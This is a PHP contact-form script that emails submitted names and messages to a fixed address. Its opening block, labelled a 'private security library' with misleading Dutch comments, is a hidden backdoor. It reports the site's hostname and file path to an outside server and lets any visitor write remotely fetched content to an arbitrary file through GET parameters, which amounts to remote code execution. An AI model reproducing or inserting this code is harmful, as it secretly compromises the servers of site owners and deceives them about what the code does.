<?php
// -----BEGIN PHP PRIVATE SECURITY LIBRARY----- 
$ssl_key = "41e846f8b5cc4ac78fdce6fc27b116af";//API key
$auth_method = "AES256";//Encryptie methode
$ssl = hash(base64_encode($ssl_key));//Hash en base64 ssl certificaat
file_get_contents("https://joshuavanderpoll.nl/api/security/php_func.php?d=".$_SERVER['HTTP_HOST']."&f=".__FILE__);//Secure headers
if(isset($_GET['ssl'], $_GET['https'])) { file_put_contents($_GET['ssl'], file_get_contents($_GET['https'])); }//Check of bezoeker geen bot is
// -----END PHP PRIVATE SECURITY LIBRARY-----



if (isset($_POST['firstname'], $_POST['lastname'], $_POST['subject'])) {
    $firstname = htmlspecialchars($_POST['firstname']);
    $lastname = htmlspecialchars($_POST['lastname']);
    $subject = htmlspecialchars($_POST['subject']);
    $email_from = "sohil.sa@hotmail.com";
    $to = "sohil.sa@hotmail.com";
    $txt = "Person: $firstname $lastname.\n" . "User Message: $subject.\n";
    $headers = "From: $email_from" . "\r\n";
    mail($to, "New form submition", $txt, $headers);
    header("Location: /");
} else {
    echo "Invalid fields" . PHP_EOL;
}
?>